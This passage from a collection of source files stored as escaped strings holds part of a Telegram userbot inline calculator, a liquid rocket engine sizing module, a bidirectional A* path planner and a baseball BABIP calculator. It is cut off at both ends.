[Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\nlst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\nlst.append([Button.inline(\"=\", data=\"calc=\")])\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.delete(\"calc\")\n    if e.client._bot:\n        return await e.reply(\"\u2022 Ultroid Inline Calculator \u2022\", buttons=lst)\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\")\n@in_owner\nasync def _(e):\n    calc = e.builder.article(\"Calc\", text=\"\u2022 Ultroid Inline Calculator \u2022\", buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"))\n@owner\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    if x == \"AC\":\n        udB.delete(\"calc\")\n        await e.edit(\n            \"\u2022 Ultroid Inline Calculator \u2022\",\n            buttons=[Button.inline(\"Open Calculator Again\", data=\"recalc\")],\n        )\n    elif x == \"C\":\n        udB.delete(\"calc\")\n        await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get[:-1])\n            await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"/100\")\n            await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"/\")\n            await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"*\")\n            await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        get = udB.get(\"calc\")\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = await calcc(get, e)\n            try:\n                num = float(out)\n                await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                udB.delete(\"calc\")\n                await e.answer(\"Error\", cache_time=0, alert=True)\n        await e.answer(\"None\")\n    else:\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + x)\n            await e.answer(str(get + x))\n        udB.set(\"calc\", x)\n        await e.answer(str(x))\n\n\n@callback(\"recalc\")\n@owner\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(\"Noice Inline Calculator\", buttons=lst)\n", "244": "import numpy as np\nfrom scipy.optimize import fsolve\nfrom rocketcea.cea_obj_w_units import CEA_Obj\nfrom rocketcea.cea_obj import CEA_Obj as CEA_ObjSU\nfrom models import CeaOutput\n\n#GENERAL FUNCTIONS\n\ndef calcDiameter(A):\n    return np.sqrt(4*A/np.pi)\n\ndef calcVolume(M, rho):\n    return M/rho\n\ndef calcDensity(p, R, T):\n    return p/(R*T)\n\n#PROPULSION PARAMETERS\n\ndef calcGasConstant(Ru,MM):\n    return Ru*1e3/MM;\n\ndef vanker(y):\n    return np.sqrt(y*(2/(y+1))**((y+1)/(y-1)));\n\ndef calcExitPressure(gasGamma,chamberPressure,nozzleEpsilon,pressureGuess):\n    f = lambda x: 1/nozzleEpsilon - (((gasGamma+1)/2)**(1/(gasGamma-1)))* \\\n    np.sqrt((gasGamma+1)/(gasGamma-1))*((x/chamberPressure)**(1/gasGamma))* \\\n    np.sqrt(1-(x/chamberPressure)**((gasGamma-1)/gasGamma));\n    return fsolve(f,pressureGuess)\n\ndef calcCharacteristicVelocity(R_cp,T_c,GAMMA):\n    return np.sqrt(R_cp*T_c)/GAMMA\n\ndef calcExitVelocity(eta_2D,y,R_cp,T_c,p_e,p_c):\n    return eta_2D*np.sqrt(2*(y/(y-1))*R_cp*T_c*(1-(p_e/p_c)**((y-1)/y)));\n    #RITORNA UN ARRAY\n\ndef calcAdaptedSpecificImpulse(u_e,g_0):\n    return u_e/g_0\n\ndef calcAdaptedThrustCoefficient(eta_2D,I_s_e,g_0,c_star):\n    return eta_2D*I_s_e*g_0/c_star\n\ndef calcThrustCoefficientWhat(p_a,y,eps,p_e,p_c):\n    return np.sqrt((2*(y**2)/(y-1))*((2/(y+1))**((y+1)/(y-1))))+eps*((p_e-p_a)/p_c);\n\ndef calcThrustCoefficient(p_a,y,eps,p_e,p_c,eta_2d):\n    return eta_2d*y*np.sqrt(2/(y-1)*((2/(y+1))**((y+1)/(y-1)))*(1-(p_e/p_c)**((y-1)/y)))+eps*(p_e-p_a)/p_c;\n\ndef calcPropFlowRate(T_z, u_e, eps, p_c, ct, p_e, p_z):\n    return T_z/(u_e+((eps*u_e)/(p_c*ct))*(p_e-p_z));\n\ndef calcThroatArea(m_p, u_e, p_c, ct):\n    return (m_p*u_e)/(p_c*ct)\n\ndef calcExitArea(A_t,eps):\n    return A_t*eps\n\ndef calcThrust(m_p, u_e, A_e, p_e, p_a):\n    return m_p*u_e + (p_e-p_a)*A_e\n\ndef calcTropoPressure(z,p_0,T_0,a,g_0, R_air):\n    return p_0*(1+a*z/T_0)**(-g_0/(a*R_air))\n\ndef calcPressureFromAltitude(z,p_0,T_0,a,g_0, R_air):\n    return np.where(z<=11e3,calcTropoPressure(z,p_0,T_0,a,g_0, R_air),calcTropoPressure(11e3,p_0,T_0,a,g_0, R_air)*np.exp(-g_0*(z-11e3)/(R_air*(T_0-a*11e3))))\n\ndef calcAltitudeFromPressure(p,p_0,T_0,a,g_0, R_air):\n    return np.where(p<=calcTropoPressure(11e3,p_0,T_0,a,g_0, R_air),11e3-R_air*(T_0-a*11e3)*np.log(p/calcTropoPressure(11e3,p_0,T_0,a,g_0, R_air))/g_0,calcTropoAltitude(p,p_0,T_0,a,g_0, R_air))\n\ndef calcTropoAltitude(p,p_0,T_0,a,g_0, R_air):\n    return T_0/a*((p/p_0)**(-a*R_air/g_0)-1)\n\ndef kiloNewtonToNewton(f):\n    return 1e3*f\n\ndef calcFuelRate(m_p,r):\n    return m_p/(r+1)\n\ndef calcOxidizerRate(m_f, r):\n    return r*m_f\n\ndef calcMass(m, t_b, k_s):\n    return m*t_b*k_s\n\ndef calcRhoAvg(M_f, M_ox, V_f, V_ox):\n    return (M_f+M_ox)/(V_f+V_ox)\n\ndef calcSpecificImpulse(thr, m_p, g_0):\n    return thr/(m_p*g_0)\n\ndef calcVolumetricSpecificImpulse(I_s, rho_avg):\n    return I_s*rho_avg\n\ndef calcTotalVolumetricImpulse(I_s, M_ox, M_f, g_0):\n    return I_s*(M_ox+M_f)*g_0\n\n#COMBUSTION CHAMBER\n\ndef calcChamberVelocity(Ma_c, y_c, R_c, T_c):\n    return Ma_c*np.sqrt(y_c*R_c*T_c)\n\ndef calcChamberArea(m_p, rho_c, u_c):\n    return m_p/(rho_c*u_c)\n\ndef calcChamberVolume(L_star, A_t):\n    return L_star*A_t\n\ndef calcChamberLength(V_c, A_c):\n    return V_c/A_c\n\n#INJECTOR PLATE\n\ndef calcTotalHolesArea(m, C_d, rho, p_loss_inj, p_c):\n    return m/(C_d*np.sqrt(2*rho*p_loss_inj*p_c))\n\ndef calcNumber1Holes(A_th):\n    return 4*A_th/(np.pi*1e-6)\n\ndef calcNumberHoles(n_h_f, n_h_ox):\n    return np.ceil(min(n_h_f, n_h_ox))\n\ndef calcHoleArea(A_th, n_h):\n    return A_th/n_h\n\ndef calcInjectionVelocity(C_d, p_loss_inj, p_c, rho):\n    return C_d*np.sqrt(2*p_loss_inj*p_c/rho)\n\ndef calcFuelInjectionAngle(m_ox, m_f, u_ox, u_f, alfa_ox):\n    return np.arcsin(np.sin(alfa_ox)*(m_ox*u_ox)/(m_f*u_f))\n\ndef calcPStarF(p_c,P_loss_inj,P_loss_exc,P_loss_feed,P_loss_valves):\n    return p_c*(1+P_loss_inj+P_loss_exc+P_loss_feed+P_loss_valves)\n\n#FEED LINE\n\ndef calcPStarOx(p_c,P_loss_inj,P_loss_feed,P_loss_valves):\n    return p_c*(1+P_loss_inj+P_loss_feed+P_loss_valves)\n\n#NOZZLE\n\ndef calcConeLength(eps, D_t, theta):\n    return (np.sqrt(eps)-1)*(D_t/2)/np.tan(theta)\n\ndef calcBellLength(L_cone):\n    return 0.8*L_cone\n\ndef calcThetai(D_c, D_t):\n    f = lambda x: D_c/2-1.5*(D_t/2)*np.sin(x)-1.5*(D_t/2)-D_t/2\n    return fsolve(f, (-3/4)*np.pi)#VALORE TIPICO theta_i\n\ndef calcXConv(alpha, D_t):\n    a=D_t/2\n    interval = np.linspace(alpha, np.pi*3/2, 20)\n    return 1.5*a*np.cos(interval)\n\ndef calcYConv(alpha, D_t):\n    a=D_t/2\n    interval = np.linspace(alpha, np.pi*3/2, 20)\n    return 1.5*a*(np.sin(interval)+1)+a\n\ndef calcXDivPlus(theta_n, D_t):\n    interval = np.linspace(-np.pi/2, theta_n-np.pi/2, 50)\n    return 0.382*(D_t/2)*np.cos(interval)\n\ndef calcYDivPlus(theta_n, D_t):\n    interval = np.linspace(-np.pi/2, theta_n-np.pi/2, 50)\n    return 0.382*(D_t/2)*(np.sin(interval)+1)+D_t/2\n\ndef calcXDivMinus(theta_n, theta_e, D_t, L_bell, D_e):\n    N_x = 0.382*(D_t/2)*np.cos(theta_n-np.pi/2)\n    N_y = 0.382*(D_t/2)*(np.sin(theta_n-np.pi/2)+1)+D_t/2\n    C_1 = N_y-np.tan(theta_n)*N_x\n    C_2 = (D_e/2)-np.tan(theta_e)*L_bell\n    Q_x = (C_2-C_1)/(np.tan(theta_n)-np.tan(theta_e))\n    t = np.linspace(0, 1, 50)\n    return N_x*(1-t)**2 + 2*Q_x*(1-t)*t + L_bell*t**2\n\ndef calcYDivMinus(theta_n, theta_e, D_t, L_bell, D_e):\n    N_x = 0.382 * (D_t / 2) * np.cos(theta_n - np.pi / 2)\n    N_y = 0.382 * (D_t / 2) * (np.sin(theta_n - np.pi / 2) + 1) + D_t / 2\n    C_1 = N_y - np.tan(theta_n) * N_x\n    C_2 = (D_e / 2) - np.tan(theta_e) * L_bell\n    Q_y = (np.tan(theta_n)*C_2-np.tan(theta_e)*C_1)/(np.tan(theta_n)-np.tan(theta_e))\n    t = np.linspace(0, 1, 50)\n    return N_y*(1-t)**2 + 2*Q_y*(1-t)*t + (D_e/2)*t**2\n\ndef calcAlpha(D_c,D_t,rad):\n    a=D_t/2\n    b=D_c/2\n    return np.arcsin((rad+5/2*a-b)/(rad+3/2*a))+np.pi\n\ndef calcLTC(D_c,D_t,alpha):\n    a=D_t/2\n    b=D_c/2\n    return np.cos(alpha)/(1+np.sin(alpha))*(a-b)\n\ndef calcRad(D_c,D_t,alpha):\n    a=D_t/2\n    b=D_c/2\n    return (b-a*(5/2+3/2*np.sin(alpha)))/(1+np.sin(alpha))\n\ndef calcXRac(alpha,l_tc,rad):\n    beta=alpha-np.pi\n    interval = np.linspace(beta, np.pi/2, 50)\n    return -l_tc + rad*np.cos(interval)\n\ndef calcYRac(alpha,D_c,rad):\n    b=D_c/2\n    beta=alpha-np.pi\n    interval = np.linspace(beta, np.pi/2, 50)\n    return b - rad + rad*np.sin(interval)\n\ndef calcXCc(l_tc,L_c):\n    return np.array([-l_tc-L_c,-l_tc-L_c,-l_tc])\n\ndef calcYCc(D_c):\n    return np.array([0,D_c/2,D_c/2])\n\n#CEA\n\ndef getCeaObj(fuelName, oxName):\n    #print(type(fuelName),type(oxName))\n    return CEA_Obj( oxName=oxName, fuelName=fuelName, pressure_units='Pa', temperature_units='K', density_units='kg/m^3', sonic_velocity_units='m/s',specific_heat_units='J/kg-K')\n\ndef getCeaObjSU(fuelName, oxName):\n    #print(type(fuelName),type(oxName))\n    return CEA_ObjSU( oxName=oxName, fuelName=fuelName)\n\ndef getCeaChamberMM(obj,pc,mr,eps=1):\n    return obj.get_Chamber_MolWt_gamma(Pc=pc,MR=mr,eps=eps)[0]\n\ndef getCeaChamberGam(obj,pc,mr,eps=1):\n    return obj.get_Chamber_MolWt_gamma(Pc=pc,MR=mr,eps=eps)[1]\n\ndef getCeaThroatMM(obj,pc,mr,eps=1):\n    return obj.get_Throat_MolWt_gamma(Pc=pc,MR=mr,eps=eps)[0]\n\ndef getCeaThroatGam(obj,pc,mr,eps=1):\n    #print(obj,pc,mr,eps)\n    return obj.get_Throat_MolWt_gamma(Pc=pc,MR=mr,eps=eps)[1]\n\ndef getCeaChamberTemperature(obj,pc,mr,eps=1):\n    return obj.get_Temperatures(Pc=pc,MR=mr,eps=eps,frozen=1,frozenAtThroat=1)[0]\n\ndef getCeaThroatTemperature(obj,pc,mr,eps=1):\n    return obj.get_Temperatures(Pc=pc,MR=mr,eps=eps,frozen=1,frozenAtThroat=1)[1]\n\ndef getCeaExitTemperature(obj,pc,mr,eps=1):\n    return obj.get_Temperatures(Pc=pc,MR=mr,eps=eps,frozen=1,frozenAtThroat=1)[2]\n\ndef getCeaChamberCp(obj,pc,mr,eps=1,frozen=0):\n    return obj.get_Chamber_Cp(Pc=pc,MR=mr,eps=eps)\n\n#def getCeaThrustCoefficient(obj, pamb, pc, mr, eps):\n#    c_t = np.array([])\n#    for x in pamb:\n#        c_t = np.append(c_t, obj.getFrozen_PambCf(Pamb=x, Pc=pc, MR=mr, eps=eps, frozenAtThroat=1))\n#    return c_t\n\ndef getCeaThrustCoefficient(obj, pamb, pc, mr, eps):\n    print(obj,pamb,pc,mr,eps)\n    return obj.getFrozen_PambCf(Pamb=pamb, Pc=pc, MR=mr, eps=eps, frozenAtThroat=1)\n\ndef getCeaCharacteristicVelocity(obj, pc, mr):\n    return obj.get_Cstar(Pc=pc, MR=mr)\n\ndef getCeaExitVelocity(obj, pc, mr, eps):\n    son=obj.get_SonicVelocities(Pc=pc, MR=mr, eps=eps)[2]\n    mach=obj.get_MachNumber(Pc=pc, MR=mr, eps=eps)\n    #print(son,mach)\n    return son*mach\n\n#def getCeaSpecificImpulse(obj, pc, mr, eps, pamb):\n#    Isp = np.array([])\n#    for x in pamb:\n#        Isp = np.append(Isp, obj.estimate_Ambient_Isp(Pc=pc, MR=mr, eps=eps, Pamb=x, frozen=1, frozenAtThroat=1)[0])\n#    return Isp\n\ndef getCeaSpecificImpulse(obj, pc, mr, eps, pamb):\n    return obj.estimate_Ambient_Isp(Pc=pc, MR=mr, eps=eps, Pamb=pamb, frozen=1, frozenAtThroat=1)[0]\n\ndef Pa2Psia(pr):\n    return pr / 6894.75728\n\ndef calcSpilF(q_eng_f,deltap_pump_f,deltap_pump_ox,eta_pump_f,eta_pump_ox,rho_f,rho_ox,tau_cc,tau_pb,eta_mt,eta_ad,cp_cpb,T_c,p_out,p_c,y_cpb):\n    psi=lambda tau: tau*rho_f/rho_ox\n    bl=lambda tau: deltap_pump_f/eta_pump_f + psi(tau)*deltap_pump_ox/eta_pump_ox\n    denp=rho_f*(1+tau_pb)*eta_mt*eta_ad*cp_cpb*T_c*(1-(p_out/p_c)**((y_cpb-1)/y_cpb))\n    return bl(tau_cc)/(denp+bl(tau_pb))*q_eng_f\n\ndef getCeaFullOutput(obj, pc, mr, eps):\n    return CeaOutput(obj.get_full_cea_output(Pc=pc*1e-5, MR=mr, eps=eps, frozen=1, frozenAtThroat=1, pc_units='bar'))\n", "245": "\"\"\"\n\nBidirectional A* grid planning\n\nauthor: Erwin Lejeune (@spida_rwin)\n\nSee Wikipedia article (https://en.wikipedia.org/wiki/Bidirectional_search)\n\n\"\"\"\n\nimport math\n\nimport matplotlib.pyplot as plt\n\nshow_animation = True\n\n\nclass BidirectionalAStarPlanner:\n\n    def __init__(self, ox, oy, resolution, rr):\n        \"\"\"\n        Initialize grid map for a star planning\n\n        ox: x position list of Obstacles [m]\n        oy: y position list of Obstacles [m]\n        resolution: grid resolution [m]\n        rr: robot radius[m]\n        \"\"\"\n\n        self.min_x, self.min_y = None, None\n        self.max_x, self.max_y = None, None\n        self.x_width, self.y_width, self.obstacle_map = None, None, None\n        self.resolution = resolution\n        self.rr = rr\n        self.calc_obstacle_map(ox, oy)\n        self.motion = self.get_motion_model()\n\n    class Node:\n        def __init__(self, x, y, cost, parent_index):\n            self.x = x  # index of grid\n            self.y = y  # index of grid\n            self.cost = cost\n            self.parent_index = parent_index\n\n        def __str__(self):\n            return str(self.x) + \",\" + str(self.y) + \",\" + str(\n                self.cost) + \",\" + str(self.parent_index)\n\n    def planning(self, sx, sy, gx, gy):\n        \"\"\"\n        Bidirectional A star path search\n\n        input:\n            s_x: start x position [m]\n            s_y: start y position [m]\n            gx: goal x position [m]\n            gy: goal y position [m]\n\n        output:\n            rx: x position list of the final path\n            ry: y position list of the final path\n        \"\"\"\n\n        start_node = self.Node(self.calc_xy_index(sx, self.min_x),\n                               self.calc_xy_index(sy, self.min_y), 0.0, -1)\n        goal_node = self.Node(self.calc_xy_index(gx, self.min_x),\n                              self.calc_xy_index(gy, self.min_y), 0.0, -1)\n\n        open_set_A, closed_set_A = dict(), dict()\n        open_set_B, closed_set_B = dict(), dict()\n        open_set_A[self.calc_grid_index(start_node)] = start_node\n        open_set_B[self.calc_grid_index(goal_node)] = goal_node\n\n        current_A = start_node\n        current_B = goal_node\n        meet_point_A, meet_point_B = None, None\n\n        while 1:\n            if len(open_set_A) == 0:\n                print(\"Open set A is empty..\")\n                break\n\n            if len(open_set_B) == 0:\n                print(\"Open set B is empty..\")\n                break\n\n            c_id_A = min(\n                open_set_A,\n                key=lambda o: self.find_total_cost(open_set_A, o, current_B))\n\n            current_A = open_set_A[c_id_A]\n\n            c_id_B = min(\n                open_set_B,\n                key=lambda o: self.find_total_cost(open_set_B, o, current_A))\n\n            current_B = open_set_B[c_id_B]\n\n            # show graph\n            if show_animation:  # pragma: no cover\n                plt.plot(self.calc_grid_position(current_A.x, self.min_x),\n                         self.calc_grid_position(current_A.y, self.min_y),\n                         \"xc\")\n                plt.plot(self.calc_grid_position(current_B.x, self.min_x),\n                         self.calc_grid_position(current_B.y, self.min_y),\n                         \"xc\")\n                # for stopping simulation with the esc key.\n                plt.gcf().canvas.mpl_connect(\n                    'key_release_event',\n                    lambda event: [exit(0) if event.key == 'escape' else None])\n                if len(closed_set_A.keys()) % 10 == 0:\n                    plt.pause(0.001)\n\n            if current_A.x == current_B.x and current_A.y == current_B.y:\n                print(\"Found goal\")\n                meet_point_A = current_A\n                meet_point_B = current_B\n                break\n\n            # Remove the item from the open set\n            del open_set_A[c_id_A]\n            del open_set_B[c_id_B]\n\n            # Add it to the closed set\n            closed_set_A[c_id_A] = current_A\n            closed_set_B[c_id_B] = current_B\n\n            # expand_grid search grid based on motion model\n            for i, _ in enumerate(self.motion):\n\n                c_nodes = [self.Node(current_A.x + self.motion[i][0],\n                                     current_A.y + self.motion[i][1],\n                                     current_A.cost + self.motion[i][2],\n                                     c_id_A),\n                           self.Node(current_B.x + self.motion[i][0],\n                                     current_B.y + self.motion[i][1],\n                                     current_B.cost + self.motion[i][2],\n                                     c_id_B)]\n\n                n_ids = [self.calc_grid_index(c_nodes[0]),\n                         self.calc_grid_index(c_nodes[1])]\n\n                # If the node is not safe, do nothing\n                continue_ = self.check_nodes_and_sets(c_nodes, closed_set_A,\n                                                      closed_set_B, n_ids)\n\n                if not continue_[0]:\n                    if n_ids[0] not in open_set_A:\n                        # discovered a new node\n                        open_set_A[n_ids[0]] = c_nodes[0]\n                    else:\n                        if open_set_A[n_ids[0]].cost > c_nodes[0].cost:\n                            # This path is the best until now. record it\n                            open_set_A[n_ids[0]] = c_nodes[0]\n\n                if not continue_[1]:\n                    if n_ids[1] not in open_set_B:\n                        # discovered a new node\n                        open_set_B[n_ids[1]] = c_nodes[1]\n                    else:\n                        if open_set_B[n_ids[1]].cost > c_nodes[1].cost:\n                            # This path is the best until now. record it\n                            open_set_B[n_ids[1]] = c_nodes[1]\n\n        rx, ry = self.calc_final_bidirectional_path(\n            meet_point_A, meet_point_B, closed_set_A, closed_set_B)\n\n        return rx, ry\n\n    # takes two sets and two meeting nodes and return the optimal path\n    def calc_final_bidirectional_path(self, n1, n2, setA, setB):\n        rx_A, ry_A = self.calc_final_path(n1, setA)\n        rx_B, ry_B = self.calc_final_path(n2, setB)\n\n        rx_A.reverse()\n        ry_A.reverse()\n\n        rx = rx_A + rx_B\n        ry = ry_A + ry_B\n\n        return rx, ry\n\n    def calc_final_path(self, goal_node, closed_set):\n        # generate final course\n        rx, ry = [self.calc_grid_position(goal_node.x, self.min_x)], \\\n                 [self.calc_grid_position(goal_node.y, self.min_y)]\n        parent_index = goal_node.parent_index\n        while parent_index != -1:\n            n = closed_set[parent_index]\n            rx.append(self.calc_grid_position(n.x, self.min_x))\n            ry.append(self.calc_grid_position(n.y, self.min_y))\n            parent_index = n.parent_index\n\n        return rx, ry\n\n    def check_nodes_and_sets(self, c_nodes, closedSet_A, closedSet_B, n_ids):\n        continue_ = [False, False]\n        if not self.verify_node(c_nodes[0]) or n_ids[0] in closedSet_A:\n            continue_[0] = True\n\n        if not self.verify_node(c_nodes[1]) or n_ids[1] in closedSet_B:\n            continue_[1] = True\n\n        return continue_\n\n    @staticmethod\n    def calc_heuristic(n1, n2):\n        w = 1.0  # weight of heuristic\n        d = w * math.hypot(n1.x - n2.x, n1.y - n2.y)\n        return d\n\n    def find_total_cost(self, open_set, lambda_, n1):\n        g_cost = open_set[lambda_].cost\n        h_cost = self.calc_heuristic(n1, open_set[lambda_])\n        f_cost = g_cost + h_cost\n        return f_cost\n\n    def calc_grid_position(self, index, min_position):\n        \"\"\"\n        calc grid position\n\n        :param index:\n        :param min_position:\n        :return:\n        \"\"\"\n        pos = index * self.resolution + min_position\n        return pos\n\n    def calc_xy_index(self, position, min_pos):\n        return round((position - min_pos) / self.resolution)\n\n    def calc_grid_index(self, node):\n        return (node.y - self.min_y) * self.x_width + (node.x - self.min_x)\n\n    def verify_node(self, node):\n        px = self.calc_grid_position(node.x, self.min_x)\n        py = self.calc_grid_position(node.y, self.min_y)\n\n        if px < self.min_x:\n            return False\n        elif py < self.min_y:\n            return False\n        elif px >= self.max_x:\n            return False\n        elif py >= self.max_y:\n            return False\n\n        # collision check\n        if self.obstacle_map[node.x][node.y]:\n            return False\n\n        return True\n\n    def calc_obstacle_map(self, ox, oy):\n\n        self.min_x = round(min(ox))\n        self.min_y = round(min(oy))\n        self.max_x = round(max(ox))\n        self.max_y = round(max(oy))\n        print(\"min_x:\", self.min_x)\n        print(\"min_y:\", self.min_y)\n        print(\"max_x:\", self.max_x)\n        print(\"max_y:\", self.max_y)\n\n        self.x_width = round((self.max_x - self.min_x) / self.resolution)\n        self.y_width = round((self.max_y - self.min_y) / self.resolution)\n        print(\"x_width:\", self.x_width)\n        print(\"y_width:\", self.y_width)\n\n        # obstacle map generation\n        self.obstacle_map = [[False for _ in range(self.y_width)]\n                             for _ in range(self.x_width)]\n        for ix in range(self.x_width):\n            x = self.calc_grid_position(ix, self.min_x)\n            for iy in range(self.y_width):\n                y = self.calc_grid_position(iy, self.min_y)\n                for iox, ioy in zip(ox, oy):\n                    d = math.hypot(iox - x, ioy - y)\n                    if d <= self.rr:\n                        self.obstacle_map[ix][iy] = True\n                        break\n\n    @staticmethod\n    def get_motion_model():\n        # dx, dy, cost\n        motion = [[1, 0, 1],\n                  [0, 1, 1],\n                  [-1, 0, 1],\n                  [0, -1, 1],\n                  [-1, -1, math.sqrt(2)],\n                  [-1, 1, math.sqrt(2)],\n                  [1, -1, math.sqrt(2)],\n                  [1, 1, math.sqrt(2)]]\n\n        return motion\n\n\ndef main():\n    print(__file__ + \" start!!\")\n\n    # start and goal position\n    sx = 10.0  # [m]\n    sy = 10.0  # [m]\n    gx = 50.0  # [m]\n    gy = 50.0  # [m]\n    grid_size = 2.0  # [m]\n    robot_radius = 1.0  # [m]\n\n    # set obstacle positions\n    ox, oy = [], []\n    for i in range(-10, 60):\n        ox.append(i)\n        oy.append(-10.0)\n    for i in range(-10, 60):\n        ox.append(60.0)\n        oy.append(i)\n    for i in range(-10, 61):\n        ox.append(i)\n        oy.append(60.0)\n    for i in range(-10, 61):\n        ox.append(-10.0)\n        oy.append(i)\n    for i in range(-10, 40):\n        ox.append(20.0)\n        oy.append(i)\n    for i in range(0, 40):\n        ox.append(40.0)\n        oy.append(60.0 - i)\n\n    if show_animation:  # pragma: no cover\n        plt.plot(ox, oy, \".k\")\n        plt.plot(sx, sy, \"og\")\n        plt.plot(gx, gy, \"ob\")\n        plt.grid(True)\n        plt.axis(\"equal\")\n\n    bidir_a_star = BidirectionalAStarPlanner(ox, oy, grid_size, robot_radius)\n    rx, ry = bidir_a_star.planning(sx, sy, gx, gy)\n\n    if show_animation:  # pragma: no cover\n        plt.plot(rx, ry, \"-r\")\n        plt.pause(.0001)\n        plt.show()\n\n\nif __name__ == '__main__':\n    main()\n", "246": "import math\nimport sys\n\nlow_contact_modifiers = {\n    \"low_babip\" : 0.6,\n    \"high_babip\" : 0.7,\n    \"low_power\" : 0.1,\n    \"high_power\" : 0.2525,\n    \"low_avk\" : 0.33,\n    \"high_avk\" : 0.2\n\n}\n\nhigh_contact_modifiers = {\n    \"low_babip\" : 1.3,\n    \"high_babip\" : 0.8,\n    \"low_power\" : 0.2,\n    \"high_power\" : 0.44,\n    \"low_avk\" : 0.7,\n    \"high_avk\" : 0.45\n\n}\n\n\ndef calculate_base_ratings(raw_contact, raw_power, raw_avk):\n    calc_contact = (raw_contact-1)*2\n    calc_power = (raw_power-1)*2\n    calc_avk = (raw_avk-1)*2\n\n    return calc_contact, calc_power, calc_avk\n\ndef calc_avk_power_adjustors(calc_contact, calc_power, calc_avk):\n    modifiers = high_contact_modifiers if calc_contact > 100 else low_contact_modifiers\n    \n    if calc_avk > 100:\n        if calc_power > 100:\n            avk_power_adjustor_low_contact = low_contact_modifiers[\"high_avk\"]*(calc_avk-100) + low_contact_modifiers[\"high_power\"]*(calc_power-100)\n            avk_power_adjustor_high_contact = high_contact_modifiers[\"high_avk\"]*(calc_avk-100) + high_contact_modifiers[\"high_power\"]*(calc_power-100)\n        else:\n            avk_power_adjustor_low_contact = low_contact_modifiers[\"high_avk\"]*(calc_avk-100) + low_contact_modifiers[\"low_power\"]*(calc_power-100)\n            avk_power_adjustor_high_contact = high_contact_modifiers[\"high_avk\"]*(calc_avk-100) + high_contact_modifiers[\"low_power\"]*(calc_power-100)\n    else:\n        if calc_power > 100:\n            avk_power_adjustor_low_contact = low_contact_modifiers[\"low_avk\"]*(calc_avk-100) + low_contact_modifiers[\"high_power\"]*(calc_power-100)\n            avk_power_adjustor_high_contact = high_contact_modifiers[\"low_avk\"]*(calc_avk-100) + high_contact_modifiers[\"high_power\"]*(calc_power-100)\n        else:\n            avk_power_adjustor_low_contact = low_contact_modifiers[\"low_avk\"]*(calc_avk-100) + low_contact_modifiers[\"low_power\"]*(calc_power-100)\n            avk_power_adjustor_high_contact = high_contact_modifiers[\"low_avk\"]*(calc_avk-100) + high_contact_modifiers[\"low_power\"]*(calc_power-100)\n    \n\n    return avk_power_adjustor_low_contact, avk_power_adjustor_high_contact\n    \ndef round_up_to_even(f):\n    return math.ceil(f / 2.) * 2\n\ndef calc_babip(raw_contact, raw_power, raw_avk):\n    scaled = False\n    local_contact, local_power, local_avk = raw_contact, raw_power, raw_avk\n    if raw_contact < 11 and raw_power < 11 and raw_avk < 11:\n        local_contact = local_contact * 10\n        local_power = local_power * 10\n        local_avk = local_avk * 10\n        scaled = True\n    \n    calc_contact, calc_power, calc_avk = calculate_base_ratings(local_contact, local_power, local_avk)\n    modifiers = low_contact_modifiers\n    #print(f'calc contact:{calc_contact}  calc_power:{calc_power} calc_avk:{calc_avk}')\n\n    avk_power_adjustor_low_contact, avk_power_adjustor_high_contact = calc_avk_power_adjustors(calc_contact, calc_power, calc_avk)\n    #print(f'avk_power_adjustor_low_contact:{avk_power_adjustor_low_contact}  avk_power_adjustor_high_contact:{avk_power_adjustor_high_contact}')\n    if calc_contact > 100:\n        intermediate_contact = (calc_contact - 100 - avk_power_adjustor_high_contact)/high_contact_modifiers[\"low_babip\"] + 100\n    else:\n        intermediate_contact = (calc_contact - 100 - avk_power_adjustor_low_contact)/low_contact_modifiers[\"low_babip\"] + 100\n\n    #print(f'intermediate_contact:{intermediate_contact}')\n\n    if intermediate_contact > 100:\n        if calc_contact > 100:\n            calc_babip = (calc_contact - 100 - avk_power_adjustor_high_contact)/high_contact_modifiers[\"high_babip\"] + 100\n        else:\n            calc_babip = (calc_contact - 100 - avk_power_adjustor_high_contact)/low_contact_modifiers[\"high_babip\"] + 100\n    else:\n        if calc_contact > 100:\n            calc_babip = (calc_contact - 100 - avk_power_adjustor_high_contact)/high_contact_modifiers[\"low_babip\"] + 100\n        else:\n            calc_babip = (calc_contact - 100 - avk_power_adjustor_low_contact)/low_contact_modifiers[\"low_babip\"] + 100\n    \n    final_babip = round_up_to_even( (round(calc_babip)+1)/2 )\n\n    if scaled:\n        final_babip = round(final_babip/10)\n\n    return final_babip\n\nif __name__ == '__main__':\n    contact = int(sys.argv[1])\n    power = int(sys.argv[2])\n    avk = int(sys.argv[3])\n\n    print (f'BABIP: {calc_babip(contact, power, avk)}')\n", "247": "#!/usr/bin/python\n\nimport os\nfrom math import sqrt\nimport numpy as N\nimport struct\n\ndef run(args):\n  #the 